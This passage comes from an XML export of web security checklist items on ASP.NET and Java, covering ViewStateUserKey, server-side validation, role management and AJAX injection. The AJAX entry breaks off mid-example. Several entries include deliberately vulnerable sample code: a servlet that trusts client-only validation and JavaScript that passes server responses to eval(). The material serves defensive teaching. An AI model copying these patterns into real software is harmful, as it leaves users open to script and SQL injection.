&lt;p&gt;&lt;strong&gt;Identify pages that should be protected. &lt;/strong&gt;Review your application and make a list of all the forms that should be protected with ViewStateUserKey.&amp;nbsp; Forms that meet either of the following criteria should be protected:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The form requires authentication &lt;/li&gt;&lt;li&gt;The form triggers important application behavior or a write operation to a persistent store (eg. SQL database)&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check to see if the pages are protected. &lt;/strong&gt;ViewStateUserKey can be set per page or in the
&lt;strong&gt;OnInit&lt;/strong&gt; virtual method of the page-derived class.&amp;nbsp; &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;First check &lt;strong&gt;OnInit&lt;/strong&gt;, if you find protection there, then all of your pages are covered.&lt;br&gt;
&lt;br&gt;
&lt;pre&gt;protected override OnInit(EventArgs e) {&lt;br&gt;&amp;nbsp;&amp;nbsp; base.OnInit(e); &lt;br&gt;&amp;nbsp;&amp;nbsp; ViewStateUserKey = Session.SessionID;&lt;br&gt;}&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;Next check the individual pages, for instance:&lt;br&gt;
&lt;br&gt;
&lt;pre&gt;void Page_Init (object sender, EventArgs e) {&lt;br&gt;&amp;nbsp;&amp;nbsp; ViewStateUserKey = Session.SessionID;&lt;br&gt;}&lt;/pre&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure ViewStateUserKey is set properly. &lt;/strong&gt;Setting &lt;strong&gt;ViewStateUserKey&lt;/strong&gt; to a constant string—the same for all users—is like leaving it blank.&amp;nbsp; It must be set to something that varies for each user—such as user ID or, better yet,
 session ID.&amp;nbsp; For a number of technical and social reasons, session ID is a much better fit because a session ID is unpredictable, times out, and varies on a per-user basis.
&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;The&amp;nbsp;following code added to each&amp;nbsp;of your pages will set the key based on SessionID.&lt;/p&gt;
&lt;pre&gt;void Page_Init (object sender, EventArgs e) {&lt;br&gt;   ViewStateUserKey = Session.SessionID;&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;Alternatively, you can add this code to the &lt;strong&gt;OnInit&lt;/strong&gt; virtual method of the
&lt;strong&gt;Page&lt;/strong&gt;-derived class.&amp;nbsp; (Note that you must set this property in the
&lt;strong&gt;Page.Init&lt;/strong&gt; event).&amp;nbsp; This will allow you to write the code once rather than per page.&lt;/p&gt;
&lt;pre&gt;protected override OnInit(EventArgs e) {&lt;br&gt;   base.OnInit(e); &lt;br&gt;   ViewStateUserKey = Session.SessionID;&lt;br&gt;}&lt;/pre&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:aa797ec2-627d-4b17-8c17-5a8405415344"&gt;Use Page ViewState User Key to Counter One-Click Attacks&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>f5550797-e7b2-43e6-8f8d-6513e02d54e8</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Application Does Not Rely Only on Client-Side Validation</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Input and Data Validation</category>
    <phase>Design</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that all input validation is performed on the server. Client-side validation should only be used for performance and usability reasons.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Client-side validation is executed by the client and can be easily bypassed. Client side validation is a major design problem when it appears in web applications. It places trust in the browser, an entity that should never be trusted.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;An application can take input via various ways such as a web interface, database, file system or other software running on the server. Use the following steps to establish a validation strategy:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify all sources of input. &lt;/strong&gt;During design time, identify all of the potential input sources to your application. Scour the source code to discover sources of input that may have been missed in the design. Compile a list that you can use
 in the following steps. The most common sources are: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL based parameters &lt;/li&gt;&lt;li&gt;Form based parameters &lt;/li&gt;&lt;li&gt;Hidden fields &lt;/li&gt;&lt;li&gt;Cookies &lt;/li&gt;&lt;li&gt;HTTP headers (Host, accept types, www authentication, cache settings, encodings, etc)
&lt;/li&gt;&lt;li&gt;Local filesystem &lt;/li&gt;&lt;li&gt;Database &lt;/li&gt;&lt;li&gt;Other services running on the system &lt;/li&gt;&lt;li&gt;Javascript variables &lt;/li&gt;&lt;li&gt;File upload and attributes (filename, size, data, etc) &lt;/li&gt;&lt;li&gt;DNS results or host names &lt;/li&gt;&lt;li&gt;External component call return values (COM, AJAX, ActiveX) &lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify validation routines. &lt;/strong&gt;Each input source should have a server side validation routine associated with it. Ideally the validation will occur as soon as the input reaches your application. Shared validation routines are better than
 creating many throughout the code base and may be located in a single component.&lt;/p&gt;
&lt;p&gt;Validation may be identified by any of the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Custom Java Validator class &lt;/li&gt;&lt;li&gt;Regular expression use (&lt;strong&gt;java.util.regex&lt;/strong&gt;) &lt;/li&gt;&lt;li&gt;Method names that contain &lt;strong&gt;validate&lt;/strong&gt; or &lt;strong&gt;validator&lt;/strong&gt;
&lt;/li&gt;&lt;li&gt;Client-side validation is often linked to events:
&lt;ul&gt;
&lt;li&gt;onSubmit &lt;/li&gt;&lt;li&gt;onChange &lt;/li&gt;&lt;li&gt;onFocus &lt;/li&gt;&lt;li&gt;onBlur &lt;/li&gt;&lt;li&gt;onKeyDown/Press/Up&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure validators run on the server. &lt;/strong&gt;At a minimum, validation routines should run on the server. Server-side validation guarantees that malformed input will be caught and discarded regardless of the state that the client is in. As an optional
 feature, validation can also be implemented client side in order to improve application performance and user experience.&lt;br&gt;
&lt;br&gt;
Server-side validation is done within the application code and ideally the validation will occur as soon as the input reaches your application. In web applications, look for application-supplied validators, such as a Custom Java Validator, to validate and constrain
 input after it is received from an input source, such as a &lt;strong&gt;GET&lt;/strong&gt; parameter. Check for the use of regular expressions and
&lt;strong&gt;java.util.regex&lt;/strong&gt;, or the use of a validator that checks numeric ranges.&lt;/p&gt;
Client-side Example:
&lt;blockquote&gt;
&lt;pre&gt;//The validation function is defined in JavaScript in the client-side form&lt;br&gt;&amp;lt;script language=&amp;quot;JavaScript&amp;quot;&amp;gt; function validate()&lt;br&gt;{&lt;br&gt; ...&lt;br&gt;}&lt;br&gt;&amp;lt;/script&amp;gt;&lt;br&gt;...&lt;br&gt;// The application uses validation in the client-side form to validate the input&lt;br&gt;&amp;lt;form method=&amp;quot;post&amp;quot;&lt;br&gt; action=&amp;quot;/myapp/aggregate&amp;quot;&lt;br&gt; onsubmit=&amp;quot;return validate()&amp;quot;&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;Server-side Example:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;//The input &amp;quot;searchTerm&amp;quot; is received from a request&lt;br&gt;String searchTerm = request.getParameter(&amp;quot;index&amp;quot;);&lt;br&gt;...&lt;br&gt;// The application uses validation in the application code to validate the input&lt;br&gt;if (validateSearchTerm(searchTerm))&lt;br&gt;{&lt;br&gt;      ...&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code produces a data analysis based on a financial index. Unfortunately, the user's input is validated only on the client side via a JavaScript routine. Since there is no validation on the server, an attacker can bypass all validation and exploit
 cross-site scripting and SQL injection vulnerabilities.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;!-- Filename: idv01.html --&amp;gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;  &amp;lt;head&amp;gt;&lt;br&gt;    &amp;lt;!-- The page uses client-side validation only --&amp;gt;&lt;br&gt;    &amp;lt;script language=&amp;quot;JavaScript&amp;quot;&amp;gt;&lt;br&gt;&amp;lt;!--function validate()&lt;br&gt;{&lt;br&gt;   var idx = document.forms[0].elements[0].value;&lt;br&gt;   var regex = new RegExp(&amp;quot;[a-zA-Z0-9]&amp;#43;&amp;quot;);&lt;br&gt;   var match = regex.exec(idx);&lt;br&gt;   var ret = false;&lt;br&gt;   if(idx.length &amp;lt; 9 &amp;amp;&amp;amp; match != null)&lt;br&gt;   {&lt;br&gt;      ret = true;&lt;br&gt;   }&lt;br&gt;   else&lt;br&gt;   {&lt;br&gt;      alert(&amp;quot;Invalid index!&amp;quot;);&lt;br&gt;   }&lt;br&gt;    return ret;&lt;br&gt;}&lt;br&gt;// --&amp;gt;&lt;br&gt;    &amp;lt;/script&amp;gt;&lt;br&gt;    &amp;lt;title&amp;gt;Query for index&amp;lt;/title&amp;gt;&lt;br&gt;  &amp;lt;/head&amp;gt;&lt;br&gt;  &amp;lt;body&amp;gt;&lt;br&gt;    &amp;lt;!-- The application relies on client-side validation --&amp;gt;&lt;br&gt;    &amp;lt;form method=&amp;quot;post&amp;quot; action=&amp;quot;/myapp/aggregate&amp;quot; onsubmit=&amp;quot;return validate()&amp;quot;&amp;gt;&lt;br&gt;      index:&amp;amp;nbsp;&amp;lt;input name=&amp;quot;index&amp;quot; type=&amp;quot;text&amp;quot; size=&amp;quot;10&amp;quot;&amp;gt;&lt;br&gt;                  &amp;lt;input name=&amp;quot;submit&amp;quot; value=&amp;quot;query&amp;quot; type=&amp;quot;submit&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;/form&amp;gt;&lt;br&gt;  &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;br&gt;&lt;br&gt;//&lt;br&gt;Filename: /myapp/aggregateimport java.io.*;&lt;br&gt;import java.util.*;&lt;br&gt;import java.lang.*;&lt;br&gt;import javax.servlet.*;&lt;br&gt;import javax.servlet.http.*;&lt;br&gt;import java.util.regex.*;&lt;br&gt;public final class DataAggregator extends HttpServlet&lt;br&gt;{&lt;br&gt;      public void doGet(HttpServletRequest request, HttpServletResponse response)&lt;br&gt;            throws ServletException, IOException&lt;br&gt;      {&lt;br&gt;            PrintWriter out = response.getWriter();&lt;br&gt;            String searchTerm = request.getParameter(&amp;quot;index&amp;quot;);&lt;br&gt;             try&lt;br&gt;            {&lt;br&gt;                  String retString;&lt;br&gt;                  retString = &amp;quot;The queried index \&amp;quot;&amp;quot;;&lt;br&gt;                  retString &amp;#43;= encodeHtml(searchTerm);&lt;br&gt;                  retString &amp;#43;= &amp;quot;\&amp;quot; produced the following results:&amp;lt;br&amp;gt; &amp;quot;;&lt;br&gt;                  out.println(retString);&lt;br&gt;                  // The application does not provide a server-side validation&lt;br&gt;                  aggregateData(out, searchTerm);&lt;br&gt;            }&lt;br&gt;             catch (Exception e)&lt;br&gt;            {&lt;br&gt;                  // Add the appropriate logging and exception handling&lt;br&gt;                  // mechanisms. Consult the Exception Handling and&lt;br&gt;                  // Logging sections&lt;br&gt;                  out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                           &amp;#43; &amp;quot; Please try again later.&amp;quot;);&lt;br&gt;            }&lt;br&gt;             out.flush();&lt;br&gt;             out.close();&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:D6593992-DC9E-42C5-9E98-30E8EF075B93"&gt;Guideline: Do Not Rely on Client-Side Validation (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>fb83e483-3a9b-424c-8288-a66900d3a738</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Application Does Not Rely Only on Request Validation</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that your application does not rely solely upon ASP.NET request validation to protect against malicious input.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Request validation will catch some attacks; however, it provides only basic input validation. Do not rely on it. Use it as an extra precautionary measure in addition to your own input validation. Only you can define what represents good input for your application.
&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;To check for this problem, you must determine if your application is relying solely upon request validation to provide input and data validation. Use the following steps:&amp;nbsp;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Find all sources of input in your application.&lt;/strong&gt; During design time identify all of the potential sources of input to your application. Scour the source code to discover sources of input that may have been missed in the design. Compile a list
 that you can use in the following steps. &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify validation routines.&lt;/strong&gt; Each input source should have a data validation routine associated with it.&amp;nbsp;Ideally the validation will occur as soon after the input reaches your application as possible. Shared validation routines are better
 than creating many spread throughout your code base, so check for consolidation of routines to aid testing and reduce the chance of one-off bugs. If an input source does not have a validation routine associated with it, flag it for fixing.&lt;/p&gt;
&lt;br&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure quality of validation routines.&lt;/strong&gt; Validation routines&amp;nbsp;should check for length, range, format, and type. Validation should check first&amp;nbsp;for known valid and safe data and then for malicious, dangerous data. Do not rely on filtering out
 all malicious data because&amp;nbsp;it is too easy to miss something. Do not rely on client-side validation alone as it can be easily bypassed.&lt;/p&gt;
&lt;br&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Check for known good data and constrain input by validating it for type, length, format, and range.&amp;nbsp;For more information on protecting against injection attacks through property input validation, see
&lt;a href="http://msdn.microsoft.com/library/en-us/dnpag2/html/PAGHT000003.asp"&gt;How To: Protect From Injection Attacks in ASP.NET&lt;/a&gt;.&amp;nbsp; For more information on input validation using regular expressions, see
&lt;a href="http://msdn.microsoft.com/library/en-us/dnpag2/html/PAGHT000001.asp"&gt;How To: Use Regular Expressions to Constrain Input in ASP.NET&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: Validating input does not remove the need to format output, parameterize queries, or otherwise handle user input carefully.&lt;/p&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;An ASP.NET application uses forms authentication; however, it relies upon request validation to validate the form of the username and password entered by the user.&amp;nbsp;The application does not contain any validation routines to check input for length, range,
 format and type.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;An ASP.NET application uses forms authentication and has a variety of other input fields for user interaction.&amp;nbsp; Request validation has been left on as a precautionary measure; however, it is not the sole defense mechanism against malicious input. The application
 authors have included validation routines through which all untrusted input and data is passed before it is used by the application.&lt;/p&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;&lt;a href="?#ruledisplay:5f6a8e60-f809-4038-a725-c5019f1dc993"&gt;Guideline: Validate Input from All Sources&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;&lt;a href="?#ruledisplay:417133af-0ab8-4ad5-9aea-a59b08abf022"&gt;Checklist Item: All Input is Validated For Length, Range, Format, and Type&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>fe3f09f3-6718-48ed-afc1-717959c86a58</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Untrusted Input Passed to Data Access Methods is Validated</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Data Access</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that your application validates untrusted input that is&amp;nbsp;passed to data access methods.&lt;/p&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;If your data access methods receive input parameters from outside the trust boundary of your data access code, make sure you validate them for type, length, format, and range. You can use regular expressions for text input and perform type and range checks
 on numeric data. If you do not do this, your data access code is potentially susceptible to SQL injection.
&lt;/p&gt;
&lt;p&gt;Only omit input parameter validation in your data access methods if you know for certain that data can only be supplied by trusted code, such as your application's business logic, which you know has thoroughly validated the data passed to it.&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Avoid storing encoded data; instead, encode the data as close as possible to the output.&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>ff63f731-227d-4ef9-bb72-9c59fea7664b</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Role Manager is used for Roles Authorization Rather than Custom Code</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authorization</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that&amp;nbsp;the ASP.NET Role Manager is used for role-based authorization&amp;nbsp;rather than&amp;nbsp;custom code.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;ASP.NET provides a role manager feature that automatically creates, manages and looks up roles for the authenticated user. Role managers reduce the possibilities&amp;nbsp;of serious security issues from programmer errors&amp;nbsp;as well as&amp;nbsp;reduce the amount of custom code
 needed for an application. &lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Use the following steps to check if your application is using the Role Manager:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Check for the existence of the &amp;lt;&lt;strong&gt;roleManager&lt;/strong&gt;&amp;gt; element beneath the &amp;lt;&lt;strong&gt;system.web&lt;/strong&gt;&amp;gt; section of your application's Web.config file and make sure the
&lt;strong&gt;enabled&lt;/strong&gt; attribute is set to &lt;strong&gt;true.&lt;/strong&gt; &lt;/li&gt;&lt;li&gt;Ensure there is a connection string in the &amp;lt;&lt;strong&gt;connectionStrings&lt;/strong&gt;&amp;gt; section that points to your roles store.
&lt;/li&gt;&lt;li&gt;Ensure there is a specific provider configured in the &amp;lt;&lt;strong&gt;roleManager&lt;/strong&gt;&amp;gt;&lt;strong&gt;
&lt;/strong&gt;element. &lt;/li&gt;&lt;li&gt;Check that the &lt;strong&gt;defaultProvider&lt;/strong&gt; attribute on the &amp;lt;&lt;strong&gt;roleManager&lt;/strong&gt;&amp;gt; element points to your chosen role provider.
&lt;/li&gt;&lt;li&gt;Check your application's code and ensure it is using the Role Manager API (for example
&lt;strong&gt;Roles.IsUserInRole &lt;/strong&gt;and &lt;strong&gt;Roles.CreateRole&lt;/strong&gt;) whenever a roles check takes place.&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;User authentication access checks &lt;/li&gt;&lt;li&gt;Role access from the configured role store by the &lt;strong&gt;RoleManager&lt;/strong&gt; HTTP module using the configured role provider
&lt;/li&gt;&lt;li&gt;URL and file authorization &lt;/li&gt;&lt;li&gt;Programmatic role checks&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;This order means that role information cannot be used for an unauthenticated user. It also means that role access can be used for URL and file authorization.&lt;/p&gt;
&lt;p&gt;To use the role manager feature in an ASP.NET application, you need to do the following:
&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Add a &amp;lt;&lt;strong&gt;roleManager&lt;/strong&gt;&amp;gt; element beneath the &amp;lt;&lt;strong&gt;system.web&lt;/strong&gt;&amp;gt; section of your application's Web.config file and enable role manager by setting its
&lt;strong&gt;enabled&lt;/strong&gt; attribute to &lt;strong&gt;true&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Add a connection string to the &amp;lt;&lt;strong&gt;connectionStrings&lt;/strong&gt;&amp;gt; section to point to your roles store. If you are using the
&lt;strong&gt;AuthorizationStoreRoleProvider&lt;/strong&gt;, this is an LDAP query string pointing to your Authorization Manager Policy store in Active Directory or ADAM. If you are using the
&lt;strong&gt;SqlRoleProvider&lt;/strong&gt;, this is a database connection string that points to your role store database.
&lt;/li&gt;&lt;li&gt;Configure the specific provider in the &amp;lt;&lt;strong&gt;roleManager&lt;/strong&gt;&amp;gt;&lt;strong&gt;
&lt;/strong&gt;element in your application's Web.config file. The role manager system supports the following providers:
&lt;/li&gt;&lt;li&gt;If your application roles are in an Authorization Manager Policy store in Active Directory or ADAM, use the
&lt;strong&gt;AuthorizationStoreRoleProvider&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;If your application roles are in a SQL Server database, use the &lt;strong&gt;SqlRoleProvider.&lt;/strong&gt;
&lt;/li&gt;&lt;li&gt;If your application uses Windows groups as roles, use the &lt;strong&gt;WindowsTokenRoleProvider&lt;/strong&gt;. Note that this is recommended to be used with Windows Authentication only.
&lt;/li&gt;&lt;li&gt;If your application roles are in a store other than those previously listed, create a custom roles provider inheriting
&lt;strong&gt;RoleProvider&lt;/strong&gt; base class. &lt;/li&gt;&lt;li&gt;Set the &lt;strong&gt;defaultProvider&lt;/strong&gt; attribute on the &amp;lt;&lt;strong&gt;roleManager&lt;/strong&gt;&amp;gt; element to the chosen role provider.
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;To check roles and manage roles, use the Role Manager API (for example &lt;strong&gt;
Roles.IsUserInRole &lt;/strong&gt;and &lt;strong&gt;Roles.CreateRole&lt;/strong&gt;). &lt;/p&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:86e905f3-25a9-438c-bdc6-5b242584be2a"&gt;Use ASP.NET Role Manager for Roles Authorization&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>16c073b9-e951-4f25-a282-e867d2d808f7</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>AJAX Injection Attack</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Any</phase>
    <rule_Type>Attack</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;Applies To&lt;/h1&gt;
&lt;p&gt;Web Applications that use an AJAX implementation&lt;/p&gt;
&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;AJAX (Asynchronous Javascript and XML) technology allows web pages to dynamically update specific content behind the scenes without the need to refresh the whole page. The ability to continually update the content of an AJAX page is done by calling an XmlHttpRequest
 (XHR) object with JavaScript to send HTTP requests to web servers. These requests typically send data in the form of XML or JSON (JavaScript Object Notation).
&lt;/p&gt;
&lt;p&gt;AJAX injection is a type of &lt;a href="?#ruledisplay:BC10DCE2-CA48-44BF-8BF6-FEFBE8DCCB7E"&gt;
Cross Site Scripting Attack&lt;/a&gt; (XSS) that leverages the XML or JSON format of the input to the client browser. JSON is particularly popular because it is easy to parse JSON objects by simply passing them to the eval() function. Unfortunately, the use of eval()
 makes the application equivalently easy to exploit. Cleverly format strings containing malicious JavaScript may be stored as content on servers with weak validation or sent directly to the client browser using a spoofing or man in the middle attack. This JavaScript
 is then parsed and execute by the client's browser without their knowledge. Ultimately, this attack may be used to steal session cookies, send email on behalf of the victim, or any other impact available to the XSS attack.&lt;/p&gt;
&lt;h1&gt;Impact&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Confidentiality:&lt;/strong&gt; Since the code runs in the same domain as the trusted site any cookies or other confidential site data can be read by the malicious AJAX code.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;JavaScript code injection:&lt;/strong&gt; By using the XMLHttpRequest object attackers can download and install JavaScript code modules to be run on the local browser dynamically and send information from the computer without the victim's knowledge.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Vulnerabilities&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Failure to validate user input for script tags when that input can be echoed back into a web page.
&lt;/li&gt;&lt;li&gt;Failure to encode user supplied input upon display of the data &lt;/li&gt;&lt;li&gt;Trusting data retrieved from a shared data store.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Countermeasures&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Constrain input:&lt;/strong&gt; Use vigorous white-list style checking on any user input that may be reflected to a user's browser.
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HTMLEncode all user input on display:&lt;/strong&gt; Use white-list style HTMLEncoding libraries to ensure all possibly malicious characters are encoded before being echoed back to the user, regardless of whether they're loaded as part of the original
 page load or through later XMLHttpRequests.&lt;/p&gt;
&lt;h1&gt;Example&lt;/h1&gt;
&lt;p&gt;Suppose you use an AJAX based web mail client. Because these are the days of Web 2.0, your mail client displays a list of your favorite contacts and lets you know their status. By default this status is set to &amp;quot;Online&amp;quot; or &amp;quot;Away,&amp;quot; but a custom message may
 also be set by each contact that is reflect in your client. In order for this to work, the web page periodically updates this status list by requesting the list of contacts from the server. The server returns this information to the client as the following
 JSON object:&lt;/p&gt;
&lt;pre&gt;{&lt;br&gt;   &amp;quot;numberOnline&amp;quot;: &amp;quot;3&amp;quot;,&lt;br&gt;   &amp;quot;nameAndStatus&amp;quot;: [&lt;br&gt;   &amp;quot;Alice, Online&amp;quot;,&lt;br&gt;   &amp;quot;Bob, Online&amp;quot;,&lt;br&gt;   &amp;quot;Mallory, Away&amp;quot; ]&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;The following code shows the client JavaScript code which is called periodically to request the above object and update the DOM.&lt;/p&gt;
&lt;pre&gt;var contactStatusList;&lt;br&gt;var http_request = new XMLHttpRequest();&lt;br&gt;http_request.open(&amp;quot;GET&amp;quot;, url, true);&lt;br&gt;http_request.onreadystatechange = function ()&lt;br&gt; {&lt;br&gt;    if (http_request.readyState == 4)&lt;br&gt; {&lt;br&gt;        if (http_request.status == 200)&lt;br&gt; {&lt;br&gt;            contactStatusList = eval(&amp;quot;(&amp;quot; &amp;#43; http_request.responseText &amp;#43; &amp;quot;)&amp;quot;);&lt;br&gt;        }        http_request = null;    }};http_request.send(null);&lt;/pre&gt;
&lt;p&gt;Now suppose that Mallory's status is set to a custom value. This may have been changed by Mallory herself or by a third party attacker. Either way, because the server providing the data to the mail client has poor validation, this status value is changed
